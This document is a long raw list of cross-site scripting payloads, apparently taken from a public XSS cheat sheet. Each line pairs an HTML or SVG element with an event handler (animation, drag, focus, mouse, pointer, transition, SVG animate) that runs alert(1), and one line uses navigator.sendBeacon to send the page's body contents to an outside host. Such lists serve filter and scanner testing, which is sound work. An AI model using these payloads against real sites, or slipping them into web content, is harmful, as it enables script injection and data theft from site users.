<style>@keyframes x{}</style><q style="animation-name:x" onwebkitanimationend="alert(1)"></q>
<style>@keyframes x{}</style><q style="animation-name:x" onwebkitanimationstart="alert(1)"></q>
<style>@keyframes x{}</style><rb style="animation-name:x" onanimationend="alert(1)"></rb>
<style>@keyframes x{}</style><rb style="animation-name:x" onanimationstart="alert(1)"></rb>
<style>@keyframes x{}</style><rb style="animation-name:x" onwebkitanimationend="alert(1)"></rb>
<style>@keyframes x{}</style><rb style="animation-name:x" onwebkitanimationstart="alert(1)"></rb>
<style>@keyframes x{}</style><rp style="animation-name:x" onanimationend="alert(1)"></rp>
<style>@keyframes x{}</style><rp style="animation-name:x" onanimationstart="alert(1)"></rp>
<style>@keyframes x{}</style><rp style="animation-name:x" onwebkitanimationend="alert(1)"></rp>
<style>@keyframes x{}</style><rp style="animation-name:x" onwebkitanimationstart="alert(1)"></rp>
<style>@keyframes x{}</style><rt style="animation-name:x" onanimationend="alert(1)"></rt>
<style>@keyframes x{}</style><rt style="animation-name:x" onanimationstart="alert(1)"></rt>
<style>@keyframes x{}</style><rt style="animation-name:x" onwebkitanimationend="alert(1)"></rt>
<style>@keyframes x{}</style><rt style="animation-name:x" onwebkitanimationstart="alert(1)"></rt>
<style>@keyframes x{}</style><rtc style="animation-name:x" onanimationend="alert(1)"></rtc>
<style>@keyframes x{}</style><rtc style="animation-name:x" onanimationstart="alert(1)"></rtc>
<style>@keyframes x{}</style><rtc style="animation-name:x" onwebkitanimationend="alert(1)"></rtc>
<style>@keyframes x{}</style><rtc style="animation-name:x" onwebkitanimationstart="alert(1)"></rtc>
<style>@keyframes x{}</style><ruby style="animation-name:x" onanimationend="alert(1)"></ruby>
<style>@keyframes x{}</style><ruby style="animation-name:x" onanimationstart="alert(1)"></ruby>
<style>@keyframes x{}</style><ruby style="animation-name:x" onwebkitanimationend="alert(1)"></ruby>
<style>@keyframes x{}</style><ruby style="animation-name:x" onwebkitanimationstart="alert(1)"></ruby>
<style>@keyframes x{}</style><s style="animation-name:x" onanimationend="alert(1)"></s>
<style>@keyframes x{}</style><s style="animation-name:x" onanimationstart="alert(1)"></s>
<style>@keyframes x{}</style><s style="animation-name:x" onwebkitanimationend="alert(1)"></s>
<style>@keyframes x{}</style><s style="animation-name:x" onwebkitanimationstart="alert(1)"></s>
<style>@keyframes x{}</style><samp style="animation-name:x" onanimationend="alert(1)"></samp>
<style>@keyframes x{}</style><samp style="animation-name:x" onanimationstart="alert(1)"></samp>
<style>@keyframes x{}</style><samp style="animation-name:x" onwebkitanimationend="alert(1)"></samp>
<style>@keyframes x{}</style><samp style="animation-name:x" onwebkitanimationstart="alert(1)"></samp>
<style>@keyframes x{}</style><script style="animation-name:x" onanimationend="alert(1)"></script>
<style>@keyframes x{}</style><script style="animation-name:x" onanimationstart="alert(1)"></script>
<style>@keyframes x{}</style><script style="animation-name:x" onwebkitanimationend="alert(1)"></script>
<style>@keyframes x{}</style><script style="animation-name:x" onwebkitanimationstart="alert(1)"></script>
<style>@keyframes x{}</style><section style="animation-name:x" onanimationend="alert(1)"></section>
<style>@keyframes x{}</style><section style="animation-name:x" onanimationstart="alert(1)"></section>
<style>@keyframes x{}</style><section style="animation-name:x" onwebkitanimationend="alert(1)"></section>
<style>@keyframes x{}</style><section style="animation-name:x" onwebkitanimationstart="alert(1)"></section>
<style>@keyframes x{}</style><select style="animation-name:x" onanimationend="alert(1)"></select>
<style>@keyframes x{}</style><select style="animation-name:x" onanimationstart="alert(1)"></select>
<style>@keyframes x{}</style><select style="animation-name:x" onwebkitanimationend="alert(1)"></select>
<style>@keyframes x{}</style><select style="animation-name:x" onwebkitanimationstart="alert(1)"></select>
<style>@keyframes x{}</style><set style="animation-name:x" onanimationend="alert(1)"></set>
<style>@keyframes x{}</style><set style="animation-name:x" onanimationstart="alert(1)"></set>
<style>@keyframes x{}</style><set style="animation-name:x" onwebkitanimationend="alert(1)"></set>
<style>@keyframes x{}</style><set style="animation-name:x" onwebkitanimationstart="alert(1)"></set>
<style>@keyframes x{}</style><shadow style="animation-name:x" onanimationend="alert(1)"></shadow>
<style>@keyframes x{}</style><shadow style="animation-name:x" onanimationstart="alert(1)"></shadow>
<style>@keyframes x{}</style><shadow style="animation-name:x" onwebkitanimationend="alert(1)"></shadow>
<style>@keyframes x{}</style><shadow style="animation-name:x" onwebkitanimationstart="alert(1)"></shadow>
<style>@keyframes x{}</style><slot style="animation-name:x" onanimationend="alert(1)"></slot>
<style>@keyframes x{}</style><slot style="animation-name:x" onanimationstart="alert(1)"></slot>
<style>@keyframes x{}</style><slot style="animation-name:x" onwebkitanimationend="alert(1)"></slot>
<style>@keyframes x{}</style><slot style="animation-name:x" onwebkitanimationstart="alert(1)"></slot>
<style>@keyframes x{}</style><small style="animation-name:x" onanimationend="alert(1)"></small>
<style>@keyframes x{}</style><small style="animation-name:x" onanimationstart="alert(1)"></small>
<style>@keyframes x{}</style><small style="animation-name:x" onwebkitanimationend="alert(1)"></small>
<style>@keyframes x{}</style><small style="animation-name:x" onwebkitanimationstart="alert(1)"></small>
<style>@keyframes x{}</style><source style="animation-name:x" onanimationend="alert(1)"></source>
<style>@keyframes x{}</style><source style="animation-name:x" onanimationstart="alert(1)"></source>
<style>@keyframes x{}</style><source style="animation-name:x" onwebkitanimationend="alert(1)"></source>
<style>@keyframes x{}</style><source style="animation-name:x" onwebkitanimationstart="alert(1)"></source>
<style>@keyframes x{}</style><spacer style="animation-name:x" onanimationend="alert(1)"></spacer>
<style>@keyframes x{}</style><spacer style="animation-name:x" onanimationstart="alert(1)"></spacer>
<style>@keyframes x{}</style><spacer style="animation-name:x" onwebkitanimationend="alert(1)"></spacer>
<style>@keyframes x{}</style><spacer style="animation-name:x" onwebkitanimationstart="alert(1)"></spacer>
<style>@keyframes x{}</style><span style="animation-name:x" onanimationend="alert(1)"></span>
<style>@keyframes x{}</style><span style="animation-name:x" onanimationstart="alert(1)"></span>
<style>@keyframes x{}</style><span style="animation-name:x" onwebkitanimationend="alert(1)"></span>
<style>@keyframes x{}</style><span style="animation-name:x" onwebkitanimationstart="alert(1)"></span>
<style>@keyframes x{}</style><strike style="animation-name:x" onanimationend="alert(1)"></strike>
<style>@keyframes x{}</style><strike style="animation-name:x" onanimationstart="alert(1)"></strike>
<style>@keyframes x{}</style><strike style="animation-name:x" onwebkitanimationend="alert(1)"></strike>
<style>@keyframes x{}</style><strike style="animation-name:x" onwebkitanimationstart="alert(1)"></strike>
<style>@keyframes x{}</style><strong style="animation-name:x" onanimationend="alert(1)"></strong>
<style>@keyframes x{}</style><strong style="animation-name:x" onanimationstart="alert(1)"></strong>
<style>@keyframes x{}</style><strong style="animation-name:x" onwebkitanimationend="alert(1)"></strong>
<style>@keyframes x{}</style><strong style="animation-name:x" onwebkitanimationstart="alert(1)"></strong>
<style>@keyframes x{}</style><style style="animation-name:x" onanimationend="alert(1)"></style>
<style>@keyframes x{}</style><style style="animation-name:x" onanimationstart="alert(1)"></style>
<style>@keyframes x{}</style><style style="animation-name:x" onwebkitanimationend="alert(1)"></style>
<style>@keyframes x{}</style><style style="animation-name:x" onwebkitanimationstart="alert(1)"></style>
<style>@keyframes x{}</style><sub style="animation-name:x" onanimationend="alert(1)"></sub>
<style>@keyframes x{}</style><sub style="animation-name:x" onanimationstart="alert(1)"></sub>
<style>@keyframes x{}</style><sub style="animation-name:x" onwebkitanimationend="alert(1)"></sub>
<style>@keyframes x{}</style><sub style="animation-name:x" onwebkitanimationstart="alert(1)"></sub>
<style>@keyframes x{}</style><summary style="animation-name:x" onanimationend="alert(1)"></summary>
<style>@keyframes x{}</style><summary style="animation-name:x" onanimationstart="alert(1)"></summary>
<style>@keyframes x{}</style><summary style="animation-name:x" onwebkitanimationend="alert(1)"></summary>
<style>@keyframes x{}</style><summary style="animation-name:x" onwebkitanimationstart="alert(1)"></summary>
<style>@keyframes x{}</style><sup style="animation-name:x" onanimationend="alert(1)"></sup>
<style>@keyframes x{}</style><sup style="animation-name:x" onanimationstart="alert(1)"></sup>
<style>@keyframes x{}</style><sup style="animation-name:x" onwebkitanimationend="alert(1)"></sup>
<style>@keyframes x{}</style><sup style="animation-name:x" onwebkitanimationstart="alert(1)"></sup>
<style>@keyframes x{}</style><svg style="animation-name:x" onanimationend="alert(1)"></svg>
<style>@keyframes x{}</style><svg style="animation-name:x" onanimationstart="alert(1)"></svg>
<style>@keyframes x{}</style><svg style="animation-name:x" onwebkitanimationend="alert(1)"></svg>
<style>@keyframes x{}</style><svg style="animation-name:x" onwebkitanimationstart="alert(1)"></svg>
<style>@keyframes x{}</style><table style="animation-name:x" onanimationend="alert(1)"></table>
<style>@keyframes x{}</style><table style="animation-name:x" onanimationstart="alert(1)"></table>
<style>@keyframes x{}</style><table style="animation-name:x" onwebkitanimationend="alert(1)"></table>
<style>@keyframes x{}</style><table style="animation-name:x" onwebkitanimationstart="alert(1)"></table>
<style>@keyframes x{}</style><tbody style="animation-name:x" onanimationend="alert(1)"></tbody>
<style>@keyframes x{}</style><tbody style="animation-name:x" onanimationstart="alert(1)"></tbody>
<style>@keyframes x{}</style><tbody style="animation-name:x" onwebkitanimationend="alert(1)"></tbody>
<style>@keyframes x{}</style><tbody style="animation-name:x" onwebkitanimationstart="alert(1)"></tbody>
<style>@keyframes x{}</style><td style="animation-name:x" onanimationend="alert(1)"></td>
<style>@keyframes x{}</style><td style="animation-name:x" onanimationstart="alert(1)"></td>
<style>@keyframes x{}</style><td style="animation-name:x" onwebkitanimationend="alert(1)"></td>
<style>@keyframes x{}</style><td style="animation-name:x" onwebkitanimationstart="alert(1)"></td>
<style>@keyframes x{}</style><template style="animation-name:x" onanimationend="alert(1)"></template>
<style>@keyframes x{}</style><template style="animation-name:x" onanimationstart="alert(1)"></template>
<style>@keyframes x{}</style><template style="animation-name:x" onwebkitanimationend="alert(1)"></template>
<style>@keyframes x{}</style><template style="animation-name:x" onwebkitanimationstart="alert(1)"></template>
<style>@keyframes x{}</style><textarea style="animation-name:x" onanimationend="alert(1)"></textarea>
<style>@keyframes x{}</style><textarea style="animation-name:x" onanimationstart="alert(1)"></textarea>
<style>@keyframes x{}</style><textarea style="animation-name:x" onwebkitanimationend="alert(1)"></textarea>
<style>@keyframes x{}</style><textarea style="animation-name:x" onwebkitanimationstart="alert(1)"></textarea>
<style>@keyframes x{}</style><tfoot style="animation-name:x" onanimationend="alert(1)"></tfoot>
<style>@keyframes x{}</style><tfoot style="animation-name:x" onanimationstart="alert(1)"></tfoot>
<style>@keyframes x{}</style><tfoot style="animation-name:x" onwebkitanimationend="alert(1)"></tfoot>
<style>@keyframes x{}</style><tfoot style="animation-name:x" onwebkitanimationstart="alert(1)"></tfoot>
<style>@keyframes x{}</style><th style="animation-name:x" onanimationend="alert(1)"></th>
<style>@keyframes x{}</style><th style="animation-name:x" onanimationstart="alert(1)"></th>
<style>@keyframes x{}</style><th style="animation-name:x" onwebkitanimationend="alert(1)"></th>
<style>@keyframes x{}</style><th style="animation-name:x" onwebkitanimationstart="alert(1)"></th>
<style>@keyframes x{}</style><thead style="animation-name:x" onanimationend="alert(1)"></thead>
<style>@keyframes x{}</style><thead style="animation-name:x" onanimationstart="alert(1)"></thead>
<style>@keyframes x{}</style><thead style="animation-name:x" onwebkitanimationend="alert(1)"></thead>
<style>@keyframes x{}</style><thead style="animation-name:x" onwebkitanimationstart="alert(1)"></thead>
<style>@keyframes x{}</style><time style="animation-name:x" onanimationend="alert(1)"></time>
<style>@keyframes x{}</style><time style="animation-name:x" onanimationstart="alert(1)"></time>
<style>@keyframes x{}</style><time style="animation-name:x" onwebkitanimationend="alert(1)"></time>
<style>@keyframes x{}</style><time style="animation-name:x" onwebkitanimationstart="alert(1)"></time>
<style>@keyframes x{}</style><title style="animation-name:x" onanimationend="alert(1)"></title>
<style>@keyframes x{}</style><title style="animation-name:x" onanimationstart="alert(1)"></title>
<style>@keyframes x{}</style><title style="animation-name:x" onwebkitanimationend="alert(1)"></title>
<style>@keyframes x{}</style><title style="animation-name:x" onwebkitanimationstart="alert(1)"></title>
<style>@keyframes x{}</style><tr style="animation-name:x" onanimationend="alert(1)"></tr>
<style>@keyframes x{}</style><tr style="animation-name:x" onanimationstart="alert(1)"></tr>
<style>@keyframes x{}</style><tr style="animation-name:x" onwebkitanimationend="alert(1)"></tr>
<style>@keyframes x{}</style><tr style="animation-name:x" onwebkitanimationstart="alert(1)"></tr>
<style>@keyframes x{}</style><track style="animation-name:x" onanimationend="alert(1)"></track>
<style>@keyframes x{}</style><track style="animation-name:x" onanimationstart="alert(1)"></track>
<style>@keyframes x{}</style><track style="animation-name:x" onwebkitanimationend="alert(1)"></track>
<style>@keyframes x{}</style><track style="animation-name:x" onwebkitanimationstart="alert(1)"></track>
<style>@keyframes x{}</style><tt style="animation-name:x" onanimationend="alert(1)"></tt>
<style>@keyframes x{}</style><tt style="animation-name:x" onanimationstart="alert(1)"></tt>
<style>@keyframes x{}</style><tt style="animation-name:x" onwebkitanimationend="alert(1)"></tt>
<style>@keyframes x{}</style><tt style="animation-name:x" onwebkitanimationstart="alert(1)"></tt>
<style>@keyframes x{}</style><u style="animation-name:x" onanimationend="alert(1)"></u>
<style>@keyframes x{}</style><u style="animation-name:x" onanimationstart="alert(1)"></u>
<style>@keyframes x{}</style><u style="animation-name:x" onwebkitanimationend="alert(1)"></u>
<style>@keyframes x{}</style><u style="animation-name:x" onwebkitanimationstart="alert(1)"></u>
<style>@keyframes x{}</style><ul style="animation-name:x" onanimationend="alert(1)"></ul>
<style>@keyframes x{}</style><ul style="animation-name:x" onanimationstart="alert(1)"></ul>
<style>@keyframes x{}</style><ul style="animation-name:x" onwebkitanimationend="alert(1)"></ul>
<style>@keyframes x{}</style><ul style="animation-name:x" onwebkitanimationstart="alert(1)"></ul>
<style>@keyframes x{}</style><var style="animation-name:x" onanimationend="alert(1)"></var>
<style>@keyframes x{}</style><var style="animation-name:x" onanimationstart="alert(1)"></var>
<style>@keyframes x{}</style><var style="animation-name:x" onwebkitanimationend="alert(1)"></var>
<style>@keyframes x{}</style><var style="animation-name:x" onwebkitanimationstart="alert(1)"></var>
<style>@keyframes x{}</style><video style="animation-name:x" onanimationend="alert(1)"></video>
<style>@keyframes x{}</style><video style="animation-name:x" onanimationstart="alert(1)"></video>
<style>@keyframes x{}</style><video style="animation-name:x" onwebkitanimationend="alert(1)"></video>
<style>@keyframes x{}</style><video style="animation-name:x" onwebkitanimationstart="alert(1)"></video>
<style>@keyframes x{}</style><video2 style="animation-name:x" onanimationend="alert(1)"></video2>
<style>@keyframes x{}</style><video2 style="animation-name:x" onanimationstart="alert(1)"></video2>
<style>@keyframes x{}</style><video2 style="animation-name:x" onwebkitanimationend="alert(1)"></video2>
<style>@keyframes x{}</style><video2 style="animation-name:x" onwebkitanimationstart="alert(1)"></video2>
<style>@keyframes x{}</style><wbr style="animation-name:x" onanimationend="alert(1)"></wbr>
<style>@keyframes x{}</style><wbr style="animation-name:x" onanimationstart="alert(1)"></wbr>
<style>@keyframes x{}</style><wbr style="animation-name:x" onwebkitanimationend="alert(1)"></wbr>
<style>@keyframes x{}</style><wbr style="animation-name:x" onwebkitanimationstart="alert(1)"></wbr>
<style>@keyframes x{}</style><xmp style="animation-name:x" onanimationend="alert(1)"></xmp>
<style>@keyframes x{}</style><xmp style="animation-name:x" onanimationstart="alert(1)"></xmp>
<style>@keyframes x{}</style><xmp style="animation-name:x" onwebkitanimationend="alert(1)"></xmp>
<style>@keyframes x{}</style><xmp style="animation-name:x" onwebkitanimationstart="alert(1)"></xmp>
<sub contenteditable onbeforeinput=alert(1)>test
<sub draggable="true" ondrag="alert(1)" style=display:block>test</sub>
<sub draggable="true" ondragend="alert(1)" style=display:block>test</sub>
<sub draggable="true" ondragenter="alert(1)" style=display:block>test</sub>
<sub draggable="true" ondragleave="alert(1)" style=display:block>test</sub>
<sub draggable="true" ondragstart="alert(1)" style=display:block>test</sub>
<sub id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></sub>
<sub id=x tabindex=1 onfocus=alert(1)></sub>
<sub id=x tabindex=1 onfocusin=alert(1)></sub>
<sub onafterscriptexecute=alert(1)><script>1</script>
<sub onbeforecopy="alert(1)" contenteditable>test</sub>
<sub onbeforecut="alert(1)" contenteditable>test</sub>
<sub onbeforescriptexecute=alert(1)><script>1</script>
<sub onblur=alert(1) id=x tabindex=1 style=display:block>test</sub><input value=clickme>
<sub onclick="alert(1)" style=display:block>test</sub>
<sub oncontextmenu="alert(1)" style=display:block>test</sub>
<sub oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<sub oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<sub ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</sub>
<sub onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</sub><input value=clickme>
<sub onkeydown="alert(1)" contenteditable style=display:block>test</sub>
<sub onkeypress="alert(1)" contenteditable style=display:block>test</sub>
<sub onkeyup="alert(1)" contenteditable style=display:block>test</sub>
<sub onmousedown="alert(1)" style=display:block>test</sub>
<sub onmouseenter="alert(1)" style=display:block>test</sub>
<sub onmouseleave="alert(1)" style=display:block>test</sub>
<sub onmousemove="alert(1)" style=display:block>test</sub>
<sub onmouseout="alert(1)" style=display:block>test</sub>
<sub onmouseover="alert(1)" style=display:block>test</sub>
<sub onmouseup="alert(1)" style=display:block>test</sub>
<sub onmousewheel=alert(1) style=display:block>requires scrolling
<sub onpaste="alert(1)" contenteditable>test</sub>
<sub onpointerdown=alert(1) style=display:block>XSS</sub>
<sub onpointerenter=alert(1) style=display:block>XSS</sub>
<sub onpointerleave=alert(1) style=display:block>XSS</sub>
<sub onpointermove=alert(1) style=display:block>XSS</sub>
<sub onpointerout=alert(1) style=display:block>XSS</sub>
<sub onpointerover=alert(1) style=display:block>XSS</sub>
<sub onpointerrawupdate=alert(1) style=display:block>XSS</sub>
<sub onpointerup=alert(1) style=display:block>XSS</sub>
<sub onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></sub>
<summary contenteditable onbeforeinput=alert(1)>test
<summary draggable="true" ondrag="alert(1)" style=display:block>test</summary>
<summary draggable="true" ondragend="alert(1)" style=display:block>test</summary>
<summary draggable="true" ondragenter="alert(1)" style=display:block>test</summary>
<summary draggable="true" ondragleave="alert(1)" style=display:block>test</summary>
<summary draggable="true" ondragstart="alert(1)" style=display:block>test</summary>
<summary id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></summary>
<summary id=x tabindex=1 onfocus=alert(1)></summary>
<summary id=x tabindex=1 onfocusin=alert(1)></summary>
<summary onafterscriptexecute=alert(1)><script>1</script>
<summary onbeforecopy="alert(1)" contenteditable>test</summary>
<summary onbeforecut="alert(1)" contenteditable>test</summary>
<summary onbeforescriptexecute=alert(1)><script>1</script>
<summary onblur=alert(1) id=x tabindex=1 style=display:block>test</summary><input value=clickme>
<summary onclick="alert(1)" style=display:block>test</summary>
<summary oncontextmenu="alert(1)" style=display:block>test</summary>
<summary oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<summary oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<summary ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</summary>
<summary onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</summary><input value=clickme>
<summary onkeydown="alert(1)" contenteditable style=display:block>test</summary>
<summary onkeypress="alert(1)" contenteditable style=display:block>test</summary>
<summary onkeyup="alert(1)" contenteditable style=display:block>test</summary>
<summary onmousedown="alert(1)" style=display:block>test</summary>
<summary onmouseenter="alert(1)" style=display:block>test</summary>
<summary onmouseleave="alert(1)" style=display:block>test</summary>
<summary onmousemove="alert(1)" style=display:block>test</summary>
<summary onmouseout="alert(1)" style=display:block>test</summary>
<summary onmouseover="alert(1)" style=display:block>test</summary>
<summary onmouseup="alert(1)" style=display:block>test</summary>
<summary onmousewheel=alert(1) style=display:block>requires scrolling
<summary onpaste="alert(1)" contenteditable>test</summary>
<summary onpointerdown=alert(1) style=display:block>XSS</summary>
<summary onpointerenter=alert(1) style=display:block>XSS</summary>
<summary onpointerleave=alert(1) style=display:block>XSS</summary>
<summary onpointermove=alert(1) style=display:block>XSS</summary>
<summary onpointerout=alert(1) style=display:block>XSS</summary>
<summary onpointerover=alert(1) style=display:block>XSS</summary>
<summary onpointerrawupdate=alert(1) style=display:block>XSS</summary>
<summary onpointerup=alert(1) style=display:block>XSS</summary>
<summary onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></summary>
<sup contenteditable onbeforeinput=alert(1)>test
<sup draggable="true" ondrag="alert(1)" style=display:block>test</sup>
<sup draggable="true" ondragend="alert(1)" style=display:block>test</sup>
<sup draggable="true" ondragenter="alert(1)" style=display:block>test</sup>
<sup draggable="true" ondragleave="alert(1)" style=display:block>test</sup>
<sup draggable="true" ondragstart="alert(1)" style=display:block>test</sup>
<sup id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></sup>
<sup id=x tabindex=1 onfocus=alert(1)></sup>
<sup id=x tabindex=1 onfocusin=alert(1)></sup>
<sup onafterscriptexecute=alert(1)><script>1</script>
<sup onbeforecopy="alert(1)" contenteditable>test</sup>
<sup onbeforecut="alert(1)" contenteditable>test</sup>
<sup onbeforescriptexecute=alert(1)><script>1</script>
<sup onblur=alert(1) id=x tabindex=1 style=display:block>test</sup><input value=clickme>
<sup onclick="alert(1)" style=display:block>test</sup>
<sup oncontextmenu="alert(1)" style=display:block>test</sup>
<sup oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<sup oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<sup ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</sup>
<sup onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</sup><input value=clickme>
<sup onkeydown="alert(1)" contenteditable style=display:block>test</sup>
<sup onkeypress="alert(1)" contenteditable style=display:block>test</sup>
<sup onkeyup="alert(1)" contenteditable style=display:block>test</sup>
<sup onmousedown="alert(1)" style=display:block>test</sup>
<sup onmouseenter="alert(1)" style=display:block>test</sup>
<sup onmouseleave="alert(1)" style=display:block>test</sup>
<sup onmousemove="alert(1)" style=display:block>test</sup>
<sup onmouseout="alert(1)" style=display:block>test</sup>
<sup onmouseover="alert(1)" style=display:block>test</sup>
<sup onmouseup="alert(1)" style=display:block>test</sup>
<sup onmousewheel=alert(1) style=display:block>requires scrolling
<sup onpaste="alert(1)" contenteditable>test</sup>
<sup onpointerdown=alert(1) style=display:block>XSS</sup>
<sup onpointerenter=alert(1) style=display:block>XSS</sup>
<sup onpointerleave=alert(1) style=display:block>XSS</sup>
<sup onpointermove=alert(1) style=display:block>XSS</sup>
<sup onpointerout=alert(1) style=display:block>XSS</sup>
<sup onpointerover=alert(1) style=display:block>XSS</sup>
<sup onpointerrawupdate=alert(1) style=display:block>XSS</sup>
<sup onpointerup=alert(1) style=display:block>XSS</sup>
<sup onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></sup>
<svg contenteditable onbeforeinput=alert(1)>test
<svg draggable="true" ondrag="alert(1)" style=display:block>test</svg>
<svg draggable="true" ondragend="alert(1)" style=display:block>test</svg>
<svg draggable="true" ondragenter="alert(1)" style=display:block>test</svg>
<svg draggable="true" ondragleave="alert(1)" style=display:block>test</svg>
<svg draggable="true" ondragstart="alert(1)" style=display:block>test</svg>
<svg id=x onfocus=alert(1)>
<svg id=x onfocusin=alert(1)>
<svg id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></svg>
<svg onafterscriptexecute=alert(1)><script>1</script>
<svg onbeforecopy="alert(1)" contenteditable>test</svg>
<svg onbeforecut="alert(1)" contenteditable>test</svg>
<svg onbeforescriptexecute=alert(1)><script>1</script>
<svg onblur=alert(1) id=x tabindex=1 style=display:block>test</svg><input value=clickme>
<svg onclick="alert(1)" style=display:block>test</svg>
<svg oncontextmenu="alert(1)" style=display:block>test</svg>
<svg oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<svg oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<svg ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</svg>
<svg onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</svg><input value=clickme>
<svg onkeydown="alert(1)" contenteditable style=display:block>test</svg>
<svg onkeypress="alert(1)" contenteditable style=display:block>test</svg>
<svg onkeyup="alert(1)" contenteditable style=display:block>test</svg>
<svg onload=alert(1)>
<svg onmousedown="alert(1)" style=display:block>test</svg>
<svg onmouseenter="alert(1)" style=display:block>test</svg>
<svg onmouseleave="alert(1)" style=display:block>test</svg>
<svg onmousemove="alert(1)" style=display:block>test</svg>
<svg onmouseout="alert(1)" style=display:block>test</svg>
<svg onmouseover="alert(1)" style=display:block>test</svg>
<svg onmouseup="alert(1)" style=display:block>test</svg>
<svg onmousewheel=alert(1) style=display:block>requires scrolling
<svg onpaste="alert(1)" contenteditable>test</svg>
<svg onpointerdown=alert(1) style=display:block>XSS</svg>
<svg onpointerenter=alert(1) style=display:block>XSS</svg>
<svg onpointerleave=alert(1) style=display:block>XSS</svg>
<svg onpointermove=alert(1) style=display:block>XSS</svg>
<svg onpointerout=alert(1) style=display:block>XSS</svg>
<svg onpointerover=alert(1) style=display:block>XSS</svg>
<svg onpointerrawupdate=alert(1) style=display:block>XSS</svg>
<svg onpointerup=alert(1) style=display:block>XSS</svg>
<svg onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></svg>
<svg onunload=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><animate onend=alert(1) attributeName=x dur=1s>
<svg><animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2 />
<svg><animatetransform onbegin=alert(1) attributeName=transform>
<svg><animatetransform onend=alert(1) attributeName=transform dur=1s>
<svg><animatetransform onrepeat=alert(1) attributeName=transform repeatCount=2 dur=1s>
<svg><image href=1 onerror=alert(1)>
<svg><image href=validimage.png onload=alert(1)>
<svg><path><animateMotion onbegin=alert(1) dur="1s" repeatCount="1">
<svg><path><animateMotion onend=alert(1) dur=1s repeatCount=1>
<svg><path><animateMotion onrepeat=alert(1) dur="1s" repeatCount="2">
<svg><set onbegin=alert(1) attributename=x dur=1s>
<svg><set onend=alert(1) attributename=x dur=1s>
<svg><set onrepeat=alert(1) attributename=x dur=1s repeatcount=2>
<table contenteditable onbeforeinput=alert(1)>test
<table draggable="true" ondrag="alert(1)" style=display:block>test</table>
<table draggable="true" ondragend="alert(1)" style=display:block>test</table>
<table draggable="true" ondragenter="alert(1)" style=display:block>test</table>
<table draggable="true" ondragleave="alert(1)" style=display:block>test</table>
<table draggable="true" ondragstart="alert(1)" style=display:block>test</table>
<table id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></table>
<table id=x tabindex=1 onfocus=alert(1)></table>
<table id=x tabindex=1 onfocusin=alert(1)></table>
<table onafterscriptexecute=alert(1)><script>1</script>
<table onbeforecopy="alert(1)" contenteditable>test</table>
<table onbeforecut="alert(1)" contenteditable>test</table>
<table onbeforescriptexecute=alert(1)><script>1</script>
<table onblur=alert(1) id=x tabindex=1 style=display:block>test</table><input value=clickme>
<table onclick="alert(1)" style=display:block>test</table>
<table oncontextmenu="alert(1)" style=display:block>test</table>
<table oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<table oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<table ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</table>
<table onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</table><input value=clickme>
<table onkeydown="alert(1)" contenteditable style=display:block>test</table>
<table onkeypress="alert(1)" contenteditable style=display:block>test</table>
<table onkeyup="alert(1)" contenteditable style=display:block>test</table>
<table onmousedown="alert(1)" style=display:block>test</table>
<table onmouseenter="alert(1)" style=display:block>test</table>
<table onmouseleave="alert(1)" style=display:block>test</table>
<table onmousemove="alert(1)" style=display:block>test</table>
<table onmouseout="alert(1)" style=display:block>test</table>
<table onmouseover="alert(1)" style=display:block>test</table>
<table onmouseup="alert(1)" style=display:block>test</table>
<table onmousewheel=alert(1) style=display:block>requires scrolling
<table onpaste="alert(1)" contenteditable>test</table>
<table onpointerdown=alert(1) style=display:block>XSS</table>
<table onpointerenter=alert(1) style=display:block>XSS</table>
<table onpointerleave=alert(1) style=display:block>XSS</table>
<table onpointermove=alert(1) style=display:block>XSS</table>
<table onpointerout=alert(1) style=display:block>XSS</table>
<table onpointerover=alert(1) style=display:block>XSS</table>
<table onpointerrawupdate=alert(1) style=display:block>XSS</table>
<table onpointerup=alert(1) style=display:block>XSS</table>
<table onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></table>
